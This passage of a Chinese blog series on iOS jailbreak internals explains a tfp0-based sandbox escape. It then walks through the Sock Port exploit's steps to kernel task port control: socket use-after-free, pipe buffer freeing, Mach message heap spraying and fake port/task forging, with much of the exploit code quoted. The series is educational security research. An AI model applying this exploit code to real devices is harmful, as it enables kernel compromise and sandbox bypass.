koffset(KSTRUCT_OFFSET_PROC_UCRED));</span><br><span class="line">    _assert(KERN_POINTER_VALID(ucred));</span><br><span class="line">    <span class="keyword">kptr_t</span> <span class="keyword">const</span> cr_label = ReadKernel64(ucred + koffset(KSTRUCT_OFFSET_UCRED_CR_LABEL));</span><br><span class="line">    _assert(KERN_POINTER_VALID(cr_label));</span><br><span class="line">    <span class="keyword">kptr_t</span> <span class="keyword">const</span> sandbox_addr = cr_label + <span class="number">0x8</span> + <span class="number">0x8</span>;</span><br><span class="line">    <span class="keyword">kptr_t</span> <span class="keyword">const</span> current_sandbox = ReadKernel64(sandbox_addr);</span><br><span class="line">    _assert(WriteKernel64(sandbox_addr, sandbox));</span><br><span class="line">    ret = current_sandbox;</span><br><span class="line">out:;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里说明一下 <code>sandbox_addr</code> 的计算：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kptr_t</span> <span class="keyword">const</span> sandbox_addr = cr_label + <span class="number">0x8</span> + <span class="number">0x8</span>;</span><br></pre></td></tr></table></figure>
<p>我们再回顾下 label 结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">label</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span>	l_flags;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">    	<span class="keyword">void</span>	*l_ptr;</span><br><span class="line">    	<span class="keyword">long</span>	 l_long;</span><br><span class="line">    &#125; l_perpolicy[MAC_MAX_SLOTS];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>虽然 <code>l_flags</code> 本身只有 4 字节，但 <code>l_perpolicy</code> 占据了 8n 字节，为了按照最大成员对齐，<code>l_flags</code> 也会占据 8B，因此 <code>cr_label + 8</code> 指向了 <code>l_perpolicy</code>，再偏移 8B 则指向 Sandbox 的 Policy Slot。</p>
<p>通过上述操作我们便能躲过 <code>Sandbox.kext</code> 对进程的沙盒相关检查，实现沙盒逃逸，接下来无论是通过 C 还是 OC 的 File API 都可以对 rootfs 进行读写。在 Undecimus Jailbreak 中以这种方式读取了 kernelcache 并确定 Kernel Slide 和关键偏移量。</p>
<p>我们可以通过简单实验验证沙盒逃逸成功，下面的代码读取了 kernelcache 和 Applications 目录：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">NSArray</span> *extractDir(<span class="built_in">NSString</span> *dirpath) &#123;</span><br><span class="line">    <span class="built_in">NSError</span> *error = <span class="literal">nil</span>;</span><br><span class="line">    <span class="built_in">NSArray</span> *contents = [[<span class="built_in">NSFileManager</span> defaultManager] contentsOfDirectoryAtPath:dirpath error:&amp;error];</span><br><span class="line">    <span class="keyword">if</span> (error) &#123;</span><br><span class="line">        <span class="built_in">NSLog</span>(<span class="string">@"failed to get application list"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> contents;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> sandbox_escape_test() &#123;</span><br><span class="line">    <span class="built_in">NSError</span> *error = <span class="literal">nil</span>;</span><br><span class="line">    <span class="built_in">BOOL</span> success = [<span class="built_in">NSData</span> dataWithContentsOfFile:<span class="string">@"/System/Library/Caches/com.apple.kernelcaches/kernelcache"</span> options:<span class="built_in">NSDataReadingMappedAlways</span> error:&amp;error];</span><br><span class="line">    <span class="keyword">if</span> (!success) &#123;</span><br><span class="line">        <span class="built_in">NSLog</span>(<span class="string">@"error occurred !!! %@"</span>, error);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// list applications dir</span></span><br><span class="line">    error = <span class="literal">nil</span>;</span><br><span class="line">    <span class="built_in">NSFileManager</span> *mgr = [<span class="built_in">NSFileManager</span> defaultManager];</span><br><span class="line">    <span class="built_in">NSString</span> *applicationRoot = <span class="string">@"/var/containers/Bundle/Application/"</span>;</span><br><span class="line">    <span class="built_in">NSArray</span> *uuids = [mgr contentsOfDirectoryAtPath:applicationRoot error:&amp;error];</span><br><span class="line">    <span class="keyword">if</span> (error) &#123;</span><br><span class="line">        <span class="built_in">NSLog</span>(<span class="string">@"failed to get application list"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">NSString</span> *uuid <span class="keyword">in</span> uuids) &#123;</span><br><span class="line">        <span class="built_in">NSString</span> *appPath = [applicationRoot stringByAppendingPathComponent:uuid];</span><br><span class="line">        <span class="built_in">NSArray</span> *contents = extractDir(appPath);</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">NSString</span> *content <span class="keyword">in</span> contents) &#123;</span><br><span class="line">            <span class="keyword">if</span> ([content hasSuffix:<span class="string">@".app"</span>]) &#123;</span><br><span class="line">                <span class="built_in">NSLog</span>(<span class="string">@"find %@ at %@ !!!"</span>, content, appPath);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本文简单介绍了通过 tfp0 实现 Sandbox Escape 的原理和过程，使得读者对 tfp0 能做的事情有一个简单认识。在接下来的文章中我们会介绍基于 tfp0 的 kexec 等利用。</p>
<p><img style="width: 320px;" src="https://user-gold-cdn.xitu.io/2019/8/24/16cc33a51b0a7319?w=1005&h=1164&f=png&s=197292"></img></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a href="https://www.theiphonewiki.com/wiki/AppleMobileFileIntegrity" target="_blank" rel="noopener">AppleMobileFileIntegrity. The iPhone Wiki. </a></li>
<li><a href="https://dl.packetstormsecurity.net/papers/general/apple-sandbox.pdf" target="_blank" rel="noopener">The Apple Sandbox. Dionysus Blazakis. January 11, 2011.</a></li>
<li><a href="https://blog.quarkslab.com/modern-jailbreaks-post-exploitation.html" target="_blank" rel="noopener">Modern Jailbreaks’ Post-Exploitation. Marwan Anastas</a></li>
</ol>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/12/08/Sock-Port-%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%EF%BC%88%E5%9B%9B%EF%BC%89The-tfp0/"> Sock Port 漏洞解析（四）The tfp0 !</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-12-08</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/UAF/">UAF</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Sock-Port/">Sock Port</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/tfp0/">tfp0</a></span><div class="content"><h1 id="系列文章"><a href="#系列文章" class="headerlink" title="系列文章"></a>系列文章</h1><ol>
<li><a href="https://juejin.im/post/5dd10660e51d453fac0a598d" target="_blank" rel="noopener">iOS Jailbreak Principles - Sock Port 漏洞解析（一）UAF 与 Heap Spraying</a></li>
<li><a href="https://juejin.im/post/5dd918d051882573180a2ba7" target="_blank" rel="noopener">iOS Jailbreak Principles - Sock Port 漏洞解析（二）通过 Mach OOL Message 泄露 Port Address</a></li>
<li><a href="https://juejin.im/post/5de37a236fb9a071b5615dea" target="_blank" rel="noopener">iOS Jailbreak Principles - Sock Port 漏洞解析（三）IOSurface Heap Spraying</a></li>
</ol>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>通过前 3 篇文章我们已经掌握了通过 Sock Port 达到 tfp0 所需要的 Primitives，本文将带大家分析 Sock Port 利用上述 Primitives 实现 tfp0 的过程。</p>
<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><p>本文只会对关键代码进行讲解，请大家自行打开 <a href="https://github.com/jakeajames/sock_port/tree/sock_port_2" target="_blank" rel="noopener">Sock Port 2</a> 中的 <code>exploit.c</code>，从 <code>get_tfp0</code> 函数入手结合本文进行分析。</p>
<h1 id="步骤分解"><a href="#步骤分解" class="headerlink" title="步骤分解"></a>步骤分解</h1><p>首先我们将整个获得 tfp0 的步骤分解，给大家一个整体的认识。</p>
<ol>
<li>泄露进程自己的 <code>self_port_address</code>，进而获取以下内容；<ul>
<li><code>self_task_addresss</code></li>
<li><code>ipc_space_kernel</code></li>
</ul>
</li>
<li>使用 pipe 函数分配一对进程通信管道句柄 <code>fds</code>，通过 <code>self_task_addresss</code> 包含的进程信息 <code>proc</code> 可以查询到 <code>fds</code> 句柄在内核中所分配缓冲区的实际地址 <code>pipe_buffer_address</code>；<ul>
<li>使用 pipe 可以分配出一对在进程之间读写的文件描述符，在读写的同时会在内核中分配相应的缓冲区</li>
</ul>
</li>
<li>使用上一篇文章中提到的 IOSurface Spraying 结合 Socket UAF 可以实现将 <code>pipe_buffer_address</code> 对应的内容释放，从而得到一个已释放的 <code>pipe_buffer</code>；</li>
<li>创建一个有 send right 的 <code>mach port</code>，使用 OOL Message Spraying 将其填充到已释放的 <code>pipe_buffer</code>；</li>
<li>此时内核会认为 <code>pipe_buffer</code> 中的都是合法 port，随后我们伪造一个 <code>fake port</code> 和对应的 <code>fake task</code>，然后将 <code>fake_port_address</code> 替换到 <code>pipe_buffer</code> 的前 8 个字节，这样我们就拿到了一个具有 send right 的 <code>ipc_port</code> 和 <code>task</code> 的控制权；</li>
<li>接收之前的 OOL Message，我们会重新拿到执行 OOL Message Spraying 时使用的 ports，但 ports[0] 已经被篡改为我们的 <code>fake_port</code>，我们对其有完整的控制能力；</li>
<li>通过操纵 <code>fake_port</code>，我们能够获得一个更加稳定的 Kernel Read Primitive，此后借助它枚举出内核进程，然后拿到内核的 <code>vm_map</code>；</li>
<li>将内核的 <code>vm_map</code> 赋予 <code>fake port</code>，此时我们的 <code>fake port</code> 已经是一个完备的 kernel task port，tfp0 初步成立；</li>
<li>用这个 tfp0 去创建一个更稳定的 tfp0，然后清理腐化的环境，消除后续的 Kernel Panic 隐患。</li>
</ol>
<p>下面将详细讲解这些步骤中在前序文章中未提及的内容。</p>
<h1 id="SMAP-与-Pipe-Buffer"><a href="#SMAP-与-Pipe-Buffer" class="headerlink" title="SMAP 与 Pipe Buffer"></a>SMAP 与 Pipe Buffer</h1><h2 id="Supervisor-Mode-Access-Prevention"><a href="#Supervisor-Mode-Access-Prevention" class="headerlink" title="Supervisor Mode Access Prevention"></a>Supervisor Mode Access Prevention</h2><p>PageSize 为 16KB 的 iPhone 7 及以上设备包含了被称之为 SMAP(Supervisor Mode Access Prevention) 的缓解措施，通过这项措施能够阻止内核直接访问 userland 内存，为二进制漏洞利用带来了一些限制。</p>
<p>根据 Wikipedia 上对 SMAP 的描述[1]：</p>
<blockquote>
<p>Supervisor Mode Access Prevention (SMAP) is a feature of some CPU implementations such as the Intel Broadwell microarchitecture that allows supervisor mode programs to optionally set user-space memory mappings so that access to those mappings from supervisor mode will cause a trap. This makes it harder for malicious programs to “trick” the kernel into using instructions or data from a user-space program.</p>
</blockquote>
<p>即 SMAP 使得处于 Supervisor Mode 的程序（例如 Kernel）在访问用户空间内存时会触发异常，这使得我们在用户态 fake 的数据不能直接被内核访问。为了绕过这一限制，我们必须设法在内核中分配可控的区域。</p>
<h2 id="Pipe-IO-System-Call"><a href="#Pipe-IO-System-Call" class="headerlink" title="Pipe IO System Call"></a>Pipe IO System Call</h2><p>幸运的是操作系统提供了 Pipe IO System Call，根据 GeeksforGeeks 上对 Pipe 的描述[2]：</p>
<blockquote>
<p>Conceptually, a pipe is a connection between two processes, such that the standard output from one process becomes the standard input of the other process. In UNIX Operating System, Pipes are useful for communication between related processes(inter-process communication).</p>
</blockquote>
<p>即 pipe 是两个进程间通信的管道，一个进程的标准输出将作为另一个进程的标准输入。使用 pipe 函数可以得到一对读写句柄 fds，如下图所示（图片来自 GeeksforGeeks）：</p>
<p><img src="https://user-gold-cdn.xitu.io/2019/12/8/16ee467a2c9f3e84?w=392&h=239&f=png&s=27026" alt="图片来自 GeeksforGeeks"></p>
<p>使用 pipe 读写时，由于要实现跨进程共享内存，缓冲区会被分配到内核中，在用户态拿到的是 fd 句柄，而 fd 对应的缓冲区地址被记录在了任务端口上，基于已泄露的 <code>task port</code> 和前序文章中提到的 Kernel Read Primitive 即可拿到内核中的缓冲区地址。此时我们已经间接获得了一块内核中的可控区域，关键代码如下（省略了错误检查）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// here we'll create a pair of pipes (4 file descriptors in total)</span></span><br><span class="line"><span class="comment">// first pipe, used to overwrite a port pointer in a mach message</span></span><br><span class="line"><span class="keyword">int</span> fds[<span class="number">2</span>];</span><br><span class="line">ret = pipe(fds);</span><br><span class="line"><span class="keyword">if</span> (ret) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[-] failed to create pipe\n"</span>);</span><br><span class="line">    <span class="keyword">goto</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// make the buffer of the first pipe 0x10000 bytes (this could be other sizes, but know that kernel does some calculations on how big this gets, i.e. when I made the buffer 20 bytes, it'd still go to kalloc.512</span></span><br><span class="line"><span class="keyword">uint8_t</span> pipebuf[<span class="number">0x10000</span>];</span><br><span class="line"><span class="built_in">memset</span>(pipebuf, <span class="number">0</span>, <span class="number">0x10000</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">write</span>(fds[<span class="number">1</span>], pipebuf, <span class="number">0x10000</span>); <span class="comment">// do write() to allocate the buffer on the kernel</span></span><br><span class="line"><span class="built_in">read</span>(fds[<span class="number">0</span>], pipebuf, <span class="number">0x10000</span>); <span class="comment">// do read() to reset buffer position</span></span><br><span class="line"><span class="built_in">write</span>(fds[<span class="number">1</span>], pipebuf, <span class="number">8</span>); <span class="comment">// write 8 bytes so later we can read the first 8 bytes (used to verify if spraying worked)</span></span><br></pre></td></tr></table></figure>

<p>上述代码在内核中创建了一个大小为 64K 的缓冲区，需要注意的是 fd 的读写平衡，每次 write 操作都会将 cursor 向后移动，每次 read 操作都将把 cursor 向前移动。这里先通过一次平衡的读写在内核中创建了缓冲区，随后写入 8 字节，这是为了方便之后从中读回第一个 port，即我们的 fake port。</p>
<h2 id="获取-Pipe-Buffer-Address"><a href="#获取-Pipe-Buffer-Address" class="headerlink" title="获取 Pipe Buffer Address"></a>获取 Pipe Buffer Address</h2><p>基于 <code>task port</code> 和 fd 句柄很容易就能拿到 pipe buffer 的地址，关键代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">self_port_addr = task_self_addr(); <span class="comment">// port leak primitive</span></span><br><span class="line"><span class="keyword">uint64_t</span> task = rk64_check(self_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));</span><br><span class="line">self_task_addr = task;</span><br><span class="line"><span class="keyword">uint64_t</span> proc = rk64_check(task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));</span><br><span class="line">self_proc_addr = proc;</span><br><span class="line"><span class="keyword">uint64_t</span> p_fd = rk64_check(proc + koffset(KSTRUCT_OFFSET_PROC_P_FD));</span><br><span class="line"><span class="keyword">uint64_t</span> fd_ofiles = rk64_check(p_fd + koffset(KSTRUCT_OFFSET_FILEDESC_FD_OFILES));</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> fproc = rk64_check(fd_ofiles + fds[<span class="number">0</span>] * <span class="number">8</span>);</span><br><span class="line"><span class="keyword">uint64_t</span> f_fglob = rk64_check(fproc + koffset(KSTRUCT_OFFSET_FILEPROC_F_FGLOB));</span><br><span class="line"><span class="keyword">uint64_t</span> fg_data = rk64_check(f_fglob + koffset(KSTRUCT_OFFSET_FILEGLOB_FG_DATA));</span><br><span class="line"><span class="keyword">uint64_t</span> pipe_buffer = rk64_check(fg_data + koffset(KSTRUCT_OFFSET_PIPE_BUFFER));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] pipe buffer: 0x%llx\n"</span>, pipe_buffer);</span><br></pre></td></tr></table></figure>

<h1 id="Pipe-Buffer-UAF"><a href="#Pipe-Buffer-UAF" class="headerlink" title="Pipe Buffer UAF"></a>Pipe Buffer UAF</h1><p>我们的最终目的是控制一个 port，因此需要系统将 port 分配到我们的可控区域，即 pipe buffer 中，这样我们就能对其进行完全控制。这里我们将利用 Socket UAF 释放 Pipe Buffer，再利用 Mach OOL Message Spraying 将有效的 port 填充过来。</p>
<h2 id="Socket-UAF-Free-Primitive"><a href="#Socket-UAF-Free-Primitive" class="headerlink" title="Socket UAF Free Primitive"></a>Socket UAF Free Primitive</h2><p>在前序文章中我们讲了利用 Socket UAF 实现的 Kernel Read，其实它还可以实现任意内核 Zone 的释放逻辑，这里的利用方式与之前提到的 Kernel Read 基本相同，也是把待处理的地址存储到 <code>fake options</code> 中的 <code>ip6po_pktinfo</code> 字段。区别在于 Spraying 成功后，我们不读取内容，而是给 <code>ip6po_pktinfo</code> 写一个全 0 的结构，这会导致 <code>ip6po_pktinfo</code> 指向的内容被释放。</p>
<p>按照常规的理解，释放 <code>ip6po_pktinfo</code> 指向的区域时，释放的区域长度应当以 <code>ip6po_pktinfo</code> 长度为准，但由内核中的代码得知这里使用了 FREE 函数，自动根据 zone 头部的 size 决定释放的长度，即以 <code>ip6po_pktinfo</code> 指向的区域为准，这就导致了一个任意长度区域释放的 Primitive，内核中的关键代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ip6_clearpktopts</span><span class="params">(struct ip6_pktopts *pktopt, <span class="keyword">int</span> optname)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (pktopt == <span class="literal">NULL</span>)</span><br><span class="line">    	<span class="keyword">return</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (optname == <span class="number">-1</span> || optname == IPV6_PKTINFO) &#123;</span><br><span class="line">    	<span class="keyword">if</span> (pktopt-&gt;ip6po_pktinfo)</span><br><span class="line">    		FREE(pktopt-&gt;ip6po_pktinfo, M_IP6OPT); <span class="comment">// &lt;-- free</span></span><br><span class="line">    	pktopt-&gt;ip6po_pktinfo = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<p>它是对 <code>kfree_addr</code> 的封装，而 <code>kfree_addr</code> 中有基于地址获取到 zone 及 size 的逻辑：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">vm_size_t</span> <span class="title">kfree_addr</span><span class="params">(<span class="keyword">void</span> *addr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">vm_map_t</span> <span class="built_in">map</span>;</span><br><span class="line">    <span class="keyword">vm_size_t</span> <span class="built_in">size</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">kern_return_t</span> ret;</span><br><span class="line">    <span class="keyword">zone_t</span> z;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">size</span> = zone_element_size(addr, &amp;z); <span class="comment">//</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">size</span>) &#123;</span><br><span class="line">    	DTRACE_VM3(kfree, <span class="keyword">vm_size_t</span>, <span class="number">-1</span>, <span class="keyword">vm_size_t</span>, z-&gt;elem_size, <span class="keyword">void</span>*, addr);</span><br><span class="line">    	zfree(z, addr);</span><br><span class="line">    	<span class="keyword">return</span> <span class="built_in">size</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<h2 id="Free-the-Pipe-Buffer"><a href="#Free-the-Pipe-Buffer" class="headerlink" title="Free the Pipe Buffer"></a>Free the Pipe Buffer</h2><p>利用上面的 Primitive，我们能够轻易地释放 Pipe Buffer：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// free the first pipe buffer</span></span><br><span class="line">ret = free_via_uaf(pipe_buffer);</span><br></pre></td></tr></table></figure>
<p>此时我们已经达成了 Pipe Buffer UAF。</p>
<h1 id="Mach-OOL-Message-Spraying"><a href="#Mach-OOL-Message-Spraying" class="headerlink" title="Mach OOL Message Spraying"></a>Mach OOL Message Spraying</h1><p>为了获得合法、可控的 <code>ipc_port</code>，我们使用 Mach OOL Message 进行 Heap Spraying，这里注意记录下 <code>remote port</code>，因为后续我们需要接收消息拿到被我们替换 port 的句柄：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// create a new port, this one we'll use for tfp0</span></span><br><span class="line"><span class="keyword">mach_port_t</span> target = new_port();</span><br><span class="line"><span class="comment">// reallocate it while filling it with a mach message containing send rights to our target port</span></span><br><span class="line"><span class="keyword">mach_port_t</span> p = MACH_PORT_NULL;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++) &#123;</span><br><span class="line">    <span class="comment">// pipe is 0x10000 bytes so make 0x10000/8 pointers and save result as we'll use later</span></span><br><span class="line">    p = fill_kalloc_with_port_pointer(target, <span class="number">0x10000</span>/<span class="number">8</span>, MACH_MSG_TYPE_COPY_SEND);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// check if spraying worked by reading first 8 bytes</span></span><br><span class="line">    <span class="keyword">uint64_t</span> addr;</span><br><span class="line">    <span class="built_in">read</span>(fds[<span class="number">0</span>], &amp;addr, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (addr == target_addr) &#123; <span class="comment">// if we see the address of our port, it worked</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">write</span>(fds[<span class="number">1</span>], &amp;addr, <span class="number">8</span>); <span class="comment">// reset buffer position</span></span><br><span class="line">    </span><br><span class="line">    mach_port_destroy(mach_task_self(), p); <span class="comment">// spraying didn't work, so free port</span></span><br><span class="line">    p = MACH_PORT_NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们使用了与 Pipe Buffer 尺寸相同（0x10000）的消息，以便能够成功的将 port address 填充到 Pipe Buffer 中。</p>
<p>如何检查我们是否成功呢？只需要先拿到上述 target port 的地址，再从 Pipe Buffer 中读取 8B（由于之前我们预写了 8B，这里拿到的应该是第一个 port 的地址），如果 Spraying 成功 target port address 应当等于我们从 Pipe Buffer 中读到的地址。</p>
<h1 id="伪造-port-与-task"><a href="#伪造-port-与-task" class="headerlink" title="伪造 port 与 task"></a>伪造 port 与 task</h1><h2 id="另一个-pipe"><a href="#另一个-pipe" class="headerlink" title="另一个 pipe"></a>另一个 pipe</h2><p>上述填充到 Pipe Buffer 中的依然是用户态 port，并没有 tfp0 能力，我们需要篡改这个 port 以获得 tfp0。</p>
<p>由于 SMAP 的存在，我们的 fake port 与 fake task 都需要通过 pipe 拷贝到内核中才能被正常访问，因此我们需要再创建一个 pipe。</p>
<p>Sock Port 源码中这个部分十分巧妙，它在内核中分配了能容纳 port 与 task 的连续区域，然后让 port-&gt;task 指向与之相邻的 task 区域，这样我们就用一片区域同时控制了 port 与 task，又绕过了 SMAP，关键代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> port_fds[<span class="number">2</span>] = &#123;<span class="number">-1</span>, <span class="number">-1</span>&#125;;</span><br><span class="line">pipe(port_fds);</span><br><span class="line"></span><br><span class="line"><span class="comment">// create fake port and fake task, put fake_task right after fakeport</span></span><br><span class="line"><span class="keyword">kport_t</span> *fakeport = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">kport_t</span>) + <span class="number">0x600</span>);</span><br><span class="line"><span class="keyword">ktask_t</span> *fake_task = (<span class="keyword">ktask_t</span> *)((<span class="keyword">uint64_t</span>)fakeport + <span class="keyword">sizeof</span>(<span class="keyword">kport_t</span>));</span><br><span class="line">bzero((<span class="keyword">void</span> *)fakeport, <span class="keyword">sizeof</span>(<span class="keyword">kport_t</span>) + <span class="number">0x600</span>);</span><br><span class="line"></span><br><span class="line">fake_task-&gt;ref_count = <span class="number">0xff</span>;</span><br><span class="line"></span><br><span class="line">fakeport-&gt;ip_bits = IO_BITS_ACTIVE | IKOT_TASK;</span><br><span class="line">fakeport-&gt;ip_references = <span class="number">0xd00d</span>;</span><br><span class="line">fakeport-&gt;ip_lock.type = <span class="number">0x11</span>;</span><br><span class="line">fakeport-&gt;ip_messages.port.receiver_name = <span class="number">1</span>;</span><br><span class="line">fakeport-&gt;ip_messages.port.msgcount = <span class="number">0</span>;</span><br><span class="line">fakeport-&gt;ip_messages.port.qlimit = MACH_PORT_QLIMIT_LARGE;</span><br><span class="line">fakeport-&gt;ip_messages.port.waitq.flags = mach_port_waitq_flags();</span><br><span class="line">fakeport-&gt;ip_srights = <span class="number">99</span>;</span><br><span class="line">fakeport-&gt;ip_kobject = <span class="number">0</span>;</span><br><span class="line">fakeport-&gt;ip_receiver = ipc_space_kernel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (SMAP) &#123;</span><br><span class="line">    <span class="built_in">write</span>(port_fds[<span class="number">1</span>], (<span class="keyword">void</span> *)fakeport, <span class="keyword">sizeof</span>(<span class="keyword">kport_t</span>) + <span class="number">0x600</span>);</span><br><span class="line">    <span class="built_in">read</span>(port_fds[<span class="number">0</span>], (<span class="keyword">void</span> *)fakeport, <span class="keyword">sizeof</span>(<span class="keyword">kport_t</span>) + <span class="number">0x600</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里省略了获得 port_pipe_buffer 地址的代码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (SMAP) 